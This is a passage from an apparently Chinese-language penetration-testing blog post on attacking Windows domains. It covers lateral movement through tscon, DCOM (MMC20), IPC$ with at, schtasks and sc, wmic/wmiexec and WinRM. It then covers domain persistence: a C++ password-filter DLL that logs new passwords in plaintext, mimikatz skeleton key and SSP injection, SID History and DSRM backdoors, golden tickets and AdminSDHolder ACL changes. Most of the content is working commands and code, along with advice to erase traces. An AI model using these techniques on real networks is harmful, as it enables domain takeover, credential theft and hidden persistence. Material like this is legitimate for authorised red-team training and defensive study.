<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143306.png" alt="QQ截图20210217143306"></p>
<p>那么再回到需要两个机器，一个当服务端一个当客户端的情况吧。</p>
<p>服务端建立: tsssp::server 需要SYSTEM权限</p>
<p>客户端链接: tsssp::client /target:服务端的SPN（一般采用TERMSRV服务） /pipe: \服务端域名\pipe\kekeo_tsssp_endpoint 普通用户权限即可</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143322.png" alt="QQ截图20210217143322"></p>
<h2 id="tscon横向"><a href="#tscon横向" class="headerlink" title="tscon横向"></a>tscon横向</h2><p>若一个机器上有多个用户登录，则在任务管理器可以看见如下场面</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143439.png" alt="QQ截图20210217143439"></p>
<p>其中，我们可以右键其他用户选择链接，输入其密码后就能进入其桌面</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143500.png" alt="QQ截图20210217143500"></p>
<p>但是对于system用户来说，要链接到其他用户是不需要输入密码的，可以直接连接。所以我们可以通过system权限获取登录在当前机器上的域用户权限。<br>比如上图中的administrator是域管，我有当前机器的system权限，那么我可以直接用以下命令完成用户权限获得。</p>
<p>query user 获得administrator用户的id</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143547.png" alt="QQ截图20210217143547"></p>
<p>可以发现admin的id是2，那么我们就可以用tscon这个windows自带的命令行工具完成权限获得。</p>
<p>cmd /k tscon 2 /dest:console</p>
<p>执行以上命令，我们跳转到了admin的桌面</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143616.png" alt="QQ截图20210217143616"></p>
<h2 id="利用COM-DCOM对象"><a href="#利用COM-DCOM对象" class="headerlink" title="利用COM/DCOM对象"></a>利用COM/DCOM对象</h2><p>参考:<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/256372.html">https://www.freebuf.com/articles/network/256372.html</a> </p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>DCOM是COM的扩展，允许应用程序实例化和访问远程计算机上的COM对象。<br>这里简要说一下几个有关COM的概念</p>
<p>CLSID：又叫CLASSID 一个COM类的唯一标识符，每一个Windows注册类与一个CLSID相关联。长得像这样 {20D04FE0-3AEA-1069-A2D8-08002B30309D}</p>
<p>ProgID：其可被用作对用户更友好的替代的一个CLSID，比如MMC20.APPLICATION.1就是一个ProgID。ProgID不能保证是唯一的，并非每个类都与ProgID相关联</p>
<p>Appid: 为了保证COM对象能被顺利的远程调用（即为了使DCOM可访问COM对象），需要把APPID与该类的CLSID相关联，且AppID需设置权限来规划哪些客户端能够访问</p>
<p>我们可以通过powershell执行get-CimInstance 来列出本地COM程序列表</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223152713449.png" alt="image-20210223152713449"></p>
<p>远程DCOM对象实例化的流程:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端从远程计算机请求实例化由CLSID表示的对象。如果客户端使用ProgID则先将其本地解析为CLSID。</span><br><span class="line">远程计算机检查是否存在由该CLSID所关联的AppID，并验证客户端的权限。</span><br><span class="line">DCOMLaunch服务将创建所请求的类的实例，通常是通过运行LocalServer32子项的可执行文件，或者通过创建DllHost进程来承载InProcServer32子项引用的dll。</span><br><span class="line">客户端应用程序和服务器进程间建立通信，客户端便可以访问新创建的对象。</span><br></pre></td></tr></table></figure>
<h3 id="MMC20-APPLICATION-1"><a href="#MMC20-APPLICATION-1" class="headerlink" title="MMC20.APPLICATION.1"></a>MMC20.APPLICATION.1</h3><p>中文名为： Microsoft管理控制台（MMC）2.0包括脚本对象模型。 我们一步步抽丝剥茧跟踪一下这个对象的利用点，需要注意的一点是调用该对象必须要有管理员权限。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161553486.png" alt="image-20210223161553486"></p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223160909543.png" alt="image-20210223160909543"></p>
<p>如上图，我们先列出在MMC20.APPLICATION中的模块，然后继续列出其中Document中的属性，再继续列出Document.ActiveView中的属性。可以发现一个名为ExecuteShellCommand的方法，光是听名字就知道是可以执行shell命令的方法了。到微软文档查一查这个方法，获得了以下信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ExecuteShellCommand（[命令][目录][叁数][窗口状态]）</span><br><span class="line">命令</span><br><span class="line">一个值，指定要执行的命令。可以指定标准路径。Command中包含的所有环境变量（例如“％windir％”）都将被扩展。</span><br><span class="line"></span><br><span class="line">目录</span><br><span class="line">一个值，用于指定工作目录的名称。Directory中包含的所有环境变量都将被扩展。如果“目录”为空字符串，则将当前目录用作工作目录。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">一个指定Command要使用的参数（如果有）的值；参数必须用空格分隔。例如，将参数指定为“ Param1 Param2”会导致Command接收Param1和Param2作为参数。如果要求单个参数用双引号引起来，请使用适合您的编程语言的技术。例如，在Microsoft Visual Basic中，将参数指定为“ Param1”“这是Param2”“”导致命令接收到参数1和“这是Param2”。</span><br><span class="line"></span><br><span class="line">窗口状态</span><br><span class="line">一个指定窗口状态的值。该值可以是以下字符串值之一，也可以是空字符串。如果为空字符串，则默认为“已恢复”。</span><br><span class="line"></span><br><span class="line">“Maximized”</span><br><span class="line">该命令在最大化的窗口中执行。</span><br><span class="line"></span><br><span class="line">“Minimized”</span><br><span class="line">该命令在最小化的窗口中执行。</span><br><span class="line"></span><br><span class="line">“Restored”</span><br><span class="line">该命令在已恢复或正常的窗口中执行。注意：这里会弹个黑框框</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">此方法不返回值。</span><br></pre></td></tr></table></figure>
<p>于是乎，我们就能理所应当的想到这个东西可以被用于本地任意命令执行，就像这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot;)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;) </span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161252812.png" alt="image-20210223161252812"></p>
<p>我们进一步发掘其横向移动的能力</p>
<p>我们知道DCOM具有通过网络与对象进行交互的能力，在我们是管理员的前提下我们可以使用GetTypeFromProgID()与powershell进行DCOM远程交互。<br>GetTypeFromProgID(“COM”,”远程ip”) 即可指定与哪一个远程IP进行交互。所以我们可以把payload改造成这样，进而可以在其他机器上进行任意命令执行，从而达到横向移动的目的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot; ，“远程ip”)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc"></a>ipc</h2><h3 id="ipc简介"><a href="#ipc简介" class="headerlink" title="ipc简介"></a>ipc简介</h3><p>IPC$是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，即能建立链接，达到访问远程计算机的目的。ipc共享连接成功后一般能共享所有共享盘符。（也就是IPC连接后可以远程共享C$,D$等）</p>
<p>利用这个链接不仅可以访问目标机器中的文件，进行上传下载等操作，还能在目标机器上执行部分命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;password&quot; &#x2F;user:username</span><br></pre></td></tr></table></figure>
<p>如果账户和口令正确，就建立好了链接。</p>
<p>建立好链接后就能执行以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\192.168.183.130\c$ 列出C盘</span><br><span class="line">copy C:\Users\douser\Desktop\whoami.txt \\192.168.183.130\c$ 上传文件</span><br><span class="line">tasklist &#x2F;S 192.168.183.130 &#x2F;U administrator &#x2F;P liu78963 列出某IP上的进程信息，&#x2F;U指定哪个用户执行该命令，&#x2F;p指定该用户密码</span><br><span class="line">net use \\IP &#x2F;del &#x2F;y 删除链接</span><br><span class="line">net use 查看已建立的ipc链接</span><br></pre></td></tr></table></figure>
<h3 id="利用ipc横向移动"><a href="#利用ipc横向移动" class="headerlink" title="利用ipc横向移动"></a>利用ipc横向移动</h3><h4 id="at"><a href="#at" class="headerlink" title="at"></a>at</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.183.130 17:05:00 cmd.exe &#x2F;c &quot;&lt;命令&gt;&quot;</span><br><span class="line">at \\192.168.183.130 17:05:00 powershell.exe -c &quot;&lt;命令&gt;&quot;</span><br></pre></td></tr></table></figure>
<p>关于时间的获得，可以使用 net time \\IP 获得。</p>
<p>计划任务执行后需要删除，不留痕迹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.183.130 1 &#x2F;delete  &#x2F;&#x2F;1为任务的ID</span><br></pre></td></tr></table></figure>
<p>关于此方法我们可以先通过copy上传恶意文件然后通过at来执行它，或者直接通过powershell远程加载上线等</p>
<h4 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a><strong>schtasks</strong></h4><p>at命令已经被Windows Vista、Windows Server 2008及之后版本的操作系统废弃了，取而代之的是schtasks命令。</p>
<p>横向移动的大致思路与at差不多。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的shell.exe，启动权限为system。</span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1  &#x2F;tr c:\shell.exe &#x2F;ru system &#x2F;f </span><br><span class="line"></span><br><span class="line">但也有些时候，由于当前权限或组策略设置等原因，该schtasks方法远程创建计划任务可能会报错拒绝访问,遇到这种情况，我们可以加上&#x2F;u和&#x2F;p参数分别设置高权限用户名和密码 </span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;u username &#x2F;p password &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1 &#x2F;tr c:\shell.exe &#x2F;ru system &#x2F;f</span><br><span class="line"></span><br><span class="line">另外，在我们创建好计划任务后，可以通过下列指令立即让计划任务执行（如果拒绝访问的话就加上&#x2F;u &#x2F;p参数）</span><br><span class="line">schtasks &#x2F;run &#x2F;s 192.168.183.130 &#x2F;i &#x2F;tn backdoor  &#x2F;&#x2F; i：忽略任何限制立即运行任务</span><br><span class="line"></span><br><span class="line">计划任务执行后需要清理痕迹</span><br><span class="line">schtasks &#x2F;delete &#x2F;s 192.168.183.130 &#x2F;tn &quot;backdoor&quot; &#x2F;f</span><br></pre></td></tr></table></figure>
<h4 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h4><p>这个命令可以操控服务。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\[主机名&#x2F;IP] create [servicename] binpath&#x3D; &quot;[path]&quot;   #创建服务，其中binpath可以是某个exe文件的路径，也可以是一段指令。当为路径时，服务启动时会自动执行该exe文件，当为指令时，服务启动时会自动执行该指令</span><br><span class="line">sc \\[host] start [servicename] 启动某个服务</span><br><span class="line">sc \\[host] delete [servicename]   #删除服务</span><br></pre></td></tr></table></figure>
<h2 id="wmi"><a href="#wmi" class="headerlink" title="wmi"></a>wmi</h2><p>从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以通过/node选项使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。并且wimc执行命令时不会留下日志信息。</p>
<p>通过wmic在远程主机上开启进程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.183.130 &#x2F;user:administrator &#x2F;password:Liu78963 process call create &quot;command&quot;</span><br></pre></td></tr></table></figure>
<h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><p>通过wmic创建远程进程时，不会有回显，需要通过ipc$链接type，重定向等手段才能看到回显结果，就很不方便，wmicexec的出现就很好的解决了这一痛点。具体原理是通过wmic在135端口进行交互，再把内容通过445端口传回来。</p>
<p>wmiexec普遍来说有三种版本.py，exe，.vbs。可以走socks5协议代入内网，杜绝了bypassav的麻烦。<br>(exe版本网上似乎很不好找) 这里用python版本，下载链接<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22%EF%BC%8C">https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22，</a> impacket按照网上安装来弄就行了<br>1.环境linux，我们配置好proxychanis代入内网（略<br>2.proxychains wmiexec.py 域名/用户名:密码@ip  获得shell<br>3.也可以进行hash传递 python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP </p>
<p>效果图</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226204713405.png" alt="image-20210226204713405"></p>
<h2 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h2><p>​    winRm（微软远程管理）是WS-Management协议的实现组件。WinRM是windows操作系统的一部分。是一项允许管理员在系统上远程执行管理任务的服务。通信通过HTTP（5985）或HTTPS SOAP（5986）执行，默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。 你需要管理员身份才能使用它。<br>​    适用版本:适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。</p>
<p>我们可以通过如下powershell命令查看机器上的winrm是否正常运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226223701342.png" alt="image-20210226223701342"></p>
<p>若没开启，你可以在管理员权限下执行以下指令开启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrm quickconfig -q</span><br><span class="line">or</span><br><span class="line">Enable-PSRemoting -Force</span><br></pre></td></tr></table></figure>
<p>远程命令执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrs -r:192.168.86.114 -u:192.168.86.114\administrator -p:123456!@#$% whoami</span><br></pre></td></tr></table></figure>
<h2 id="利用组策略"><a href="#利用组策略" class="headerlink" title="利用组策略"></a>利用组策略</h2><h3 id="读取脚本中的密码"><a href="#读取脚本中的密码" class="headerlink" title="读取脚本中的密码"></a>读取脚本中的密码</h3><p>假设域管想通过组策略来修改用户密码，如果他不使用GPP，那么他只有通过GPO配合脚本下发的方式来修改用户密码。</p>
<p>这种脚本可能会长得像这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strComputer &#x3D; &quot;.&quot;</span><br><span class="line">Set objUser &#x3D; GetObject(&quot;WinNT:&#x2F;&#x2F;&quot; &amp; strComputer &amp; &quot;&#x2F;Administrator, user&quot;)</span><br><span class="line">objUser.SetPassword &quot;123QWEQWE!@#&quot;</span><br><span class="line">objUser.SetInfo</span><br></pre></td></tr></table></figure>
<p>保存这个脚本为<code>cpass.vbs</code>,这个脚本的作用就是修改本地管理员账户的密码为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123QWEQWE!@#</span><br></pre></td></tr></table></figure>
<p>然后通过GPO下发此脚本，该脚本就会被保存于SYSVOL文件夹中。<br>又因为域中任何用户都可以读取SYSVOL文件夹中内容，所以我们指不定就会翻到这种暴露明文密码的脚本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;r \\dc&#x2F;sysvol %i in (*.vbs) do @echo %i</span><br><span class="line">for &#x2F;r \\dc&#x2F;sysvol %i in (*.bat) do @echo %i</span><br></pre></td></tr></table></figure>
<h3 id="批量密码"><a href="#批量密码" class="headerlink" title="批量密码"></a>批量密码</h3><p>域管可能会用组策略批量修改域中用户密码（特别是本地管理员）。所以拿到一个本地管理员密码后不妨试试密码复用，指不定就有惊喜</p>
<h1 id="域管权限维持"><a href="#域管权限维持" class="headerlink" title="域管权限维持"></a>域管权限维持</h1><h2 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h2><p>原理：当用户修改密码时会输入明文密码，LSA会调用PasswordChangeNotify 在系统中同步密码。我们HOOK这个函数，改变其行为，就能达到获取用户修改后的密码的明文.</p>
<p>Tool: Powersploit下的Invoke-ReflectivePEInjection.ps1 （用于注入）<br><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>以及 <a target="_blank" rel="noopener" href="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a> 的HookPasswordChange.dll(需自行编译)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-ReflectivePEInjection.ps1</span><br><span class="line">Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</span><br></pre></td></tr></table></figure>
<p>执行如上命令，只要修改了用户的密码，修改后的明文密码就会记录在 C:\Windows\Temp\passwords.txt 文件中。</p>
<p>下面我们分析一下原理</p>
<p>当密码改变请求发生时，LSA会调用Password Filters。每一个password filter会先验证新密码的合法性和复杂度，然后LSA会发出请求已更改的信号。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133057.png" alt="QQ截图20210217133057"></p>
<p>该过程由 password notification DLL 完成。所以我们只需要劫持这个DLL，把它换成我们自定义的DLL即可达到目的。<br>这种方式一般在Server服务器上利用率较高<br>通常来说，这个dll文件的在注册表中的路径是 hklm\system\currentcontrolset\control\lsa的 notification packages表项。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133116.png" alt="QQ截图20210217133116"></p>
<p>我们要利用该方法，首先要确保密码策略已启用</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133138.png" alt="QQ截图20210217133138"></p>
<p>至于命令行怎么修改。可以这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secedit &#x2F;export &#x2F;cfg gp.inf &#x2F;quiet   将组策略导出为文件</span><br><span class="line">在该文件里将PasswordComplexity项值修改为1</span><br><span class="line">然后用secedit &#x2F;configure &#x2F;db gp.sdb &#x2F;cfg gp.inf &#x2F;quiet 将其导入数据库</span><br><span class="line">刷新组策略： gpupdate&#x2F;force</span><br><span class="line">重启后生效</span><br></pre></td></tr></table></figure>
<p>下面我们构造dll文件去覆盖它。</p>
<p>首先我们的dll文件内容如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;NTSecAPI.h&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify() &#123;</span><br><span class="line">	OutputDebugString(L&quot;InitializeChangeNotify&quot;);</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(</span><br><span class="line">	PUNICODE_STRING AccountName,</span><br><span class="line">	PUNICODE_STRING FullName,</span><br><span class="line">	PUNICODE_STRING Password,</span><br><span class="line">	BOOLEAN SetOperation)</span><br><span class="line">&#123;</span><br><span class="line">	OutputDebugString(L&quot;PasswordFilter&quot;);</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordChangeNotify(</span><br><span class="line">	PUNICODE_STRING UserName,</span><br><span class="line">	ULONG RelativeId,</span><br><span class="line">	PUNICODE_STRING NewPassword)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *pFile;</span><br><span class="line">	fopen_s(&amp;pFile, &quot;C:\\logFile.txt&quot;, &quot;a+&quot;);</span><br><span class="line">	fprintf(pFile, &quot;%ws:%ws&quot;, UserName-&gt;Buffer, NewPassword-&gt;Buffer);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后把这个dll文件放入system32文件，然后修改注册表，使 hklm\system\currentcontrolset\control\lsa的 notification packages表项包括我们的恶意dll文件，具体命令行操作如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLMSYSTEMCurrentControlSetControlLsa&quot; &#x2F;v &quot;Notification Packages&quot; &#x2F;t REG_MULTI_SZ &#x2F;d &quot;evildll&quot; &#x2F;f</span><br></pre></td></tr></table></figure>
<p>重启后生效。无奈的是我把dll文件写出来了且确保是正确的，在win7和win2012上复现均失败，网上成功的例子是win2008server，可惜我并没有这个版本的虚拟机不过原理倒是懂了</p>
<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>运用mimkatz可以在域控机上对所有用户添加一个统一密码用来登录.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimikatz# misc::skeleton</span><br></pre></td></tr></table></figure>
<p>然后所有用户都能用密码 mimiaktz登陆了</p>
<h2 id="SSP注入"><a href="#SSP注入" class="headerlink" title="SSP注入"></a>SSP注入</h2><p>ssp:一个DLL文件，用来实现Windows身份验证功能，比如kerberos，ntlm。系统启动时SSP会被自动加载入lsass.exe<br>sspi:SSP的API接口</p>
<p>如果我们自定义个恶意dll文件让他在系统启动时自动加载到lsass.exe,就能得到进程中的明文密码</p>
<p>临时性注入(重启便失效)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimiaktz# misc::memssp</span><br></pre></td></tr></table></figure>
<p>执行如上命令, 然后只要目标机器不重启，在目标机器上登录的用户名和密码将会被记录在 C:\Windows\System32\mimilsa.log 文件中。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133322.png" alt="QQ截图20210217133322"></p>
<p>长期性注入（重启不失效）</p>
<p>把 mimikatz中的mimilib.dll放到系统的C:\Windows\System32\ 目录下，并将 mimilib.dll 添加到注册表中，使用这种方法，即使系统重启，也不会影响持久化效果。</p>
<p>修改注册表 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa 的 Security Packages 项，加载新的DLL文件</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133335.png" alt="QQ截图20210217133335"></p>
<p>用户在登录时输入的账号密码将会被记录在 C:\Windows\System32\kiwissp.log</p>
<h2 id="SID-History后门"><a href="#SID-History后门" class="headerlink" title="SID History后门"></a>SID History后门</h2><p>sid history:当我们把域A的用户x迁移到域B时，B域中x的sid会发生改变，随即而来的是权限也会发生改变。所以为了避免这种权限改变，sid history诞生了， 系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源 。</p>
<p>在域控上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add &#x2F;sam:const27 &#x2F;new:administrator 将administrator的SID添加到const27的sid history属性</span><br></pre></td></tr></table></figure>
<p>然后可以在域控上验证其sid history是否更改成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module activedirectory</span><br><span class="line">Get-ADUser const27 -Properties sidhistory</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133438.png" alt="QQ截图20210217133438"></p>
<p>可以发现现在是有SIDHistory属性了。而且末尾的500预示着ADMIN权限</p>
<h2 id="DSRM后门"><a href="#DSRM后门" class="headerlink" title="DSRM后门"></a>DSRM后门</h2><p>DSRM账号:每个域控上都有一个本地管理员账户也就是DSRM账户，用于在域环境出现故障时本地登录进行修复.可以利用这个账户进行持久化操作。（ 如果域控制器的系统版本为Windows Server 2003，则不能使用该方法进行持久化操作。 ）</p>
<p>我们先设置DSRM密码<br>域控上输入ntdsutil<br>然后输入reset password on server null<br>然后键入密码，最后按q退出即可</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133606.png" alt="QQ截图20210217133606"></p>
<p>在mimikatz中dump本地hash可以看到多出来个Administrator</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133631.png" alt="QQ截图20210217133631"></p>
<p>然后设置DSRM登陆方式<br>DSRM登陆方式有三种分别对应123.</p>
<ul>
<li>0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</li>
<li>1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</li>
<li>2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</li>
</ul>
<p>我们需要将他改成2才行。powershell执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure>
<p>即可.然后直接psexec登录(这里用的是cs)</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133652.png" alt="QQ截图20210217133652"></p>
<p>注意填Realm时要填上面dump出sam时的域名（这里是DC）</p>
<h2 id="委派后门"><a href="#委派后门" class="headerlink" title="委派后门"></a>委派后门</h2><p>这个很简单，利用约束性委派或者基于资源的约束性委派攻击得到的ST2保存起来，或者非约束性委派得到的TGT，要用的时候加载进内存就行了</p>
<h2 id="黄金票据生成"><a href="#黄金票据生成" class="headerlink" title="黄金票据生成"></a>黄金票据生成</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#提权</span><br><span class="line">privilege::debug</span><br><span class="line"> </span><br><span class="line">#生成黄金票据并导入</span><br><span class="line">kerberos::golden &#x2F;user:administrator &#x2F;domain:const.com &#x2F;sid:当前用户sid去掉最后一个数据 &#x2F;krbtgt:krbtgt的hash &#x2F;ptt</span><br></pre></td></tr></table></figure>
<h2 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h2><p>AdminSDHolder是一个特殊容器，用作受保护用户或组的ACM模板。AD定期把 AdminSDHolder对象的ACL 应用到所有受保护用户或组上，防止其被有意或故意修改。 如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法 。</p>
<p>如何寻找受保护用户或组：</p>
<p>受保护用户或组的 <strong>AdminCount属性为1</strong> 。 但是，如果对象已移出受保护组，其AdminCount属性仍为1，也就是说，有可能获得曾经是受保护组的帐户和组 。</p>
<p>使用powerview.ps1<code>Get-NetUser -AdminCount</code>即可获得受保护用户<br><code>Get-NetGroup -AdminCount</code>即可获得受保护组</p>
<p>如何修改ADMINSDHOLDER的ACL</p>
<p>域管执行以下命令(powerview.ps1)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetSearchBase &quot;LDAP:&#x2F;&#x2F;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;CONST,DC&#x3D;COM&quot; -PrincipalIdentity xx -Verbose -Rights ALL</span><br><span class="line">给AdminSDHoloder添加一条ACL,让xx用户获得完全控制权</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133841.png" alt="QQ截图20210217133841"></p>
<p>然后默认等60分钟，待ADMINSDHOLDER生效后，xx就获得所有受保护对象的完全控制权了<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133909.png" alt="QQ截图20210217133909"></p>
<h2 id="Ntds-dit"><a href="#Ntds-dit" class="headerlink" title="Ntds.dit"></a>Ntds.dit</h2><p>“Ntds.dit文件是域环境中域控上会有的一个二进制文件，是主要的活动目录数据库，其文件路径为域控的 %SystemRoot%\ntds\ntds.dit，活动目录始终会访问这个文件，所以文件禁止被读取。Ntds.dit包括但不限于有关域用户、组和组成员身份和凭据信息、GPP等信息。它包括域中所有用户的密码哈希值，为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。”——FREEBUF.whoami《内网渗透测试：从NTDS.dit获取域散列值》<br>插个题外话：非域的工作组主机其密码等信息存储在SAM中。</p>
<p>我们获取了域控后一般第一步便是导出Ntds.dit中的信息,怎么导出呢？</p>
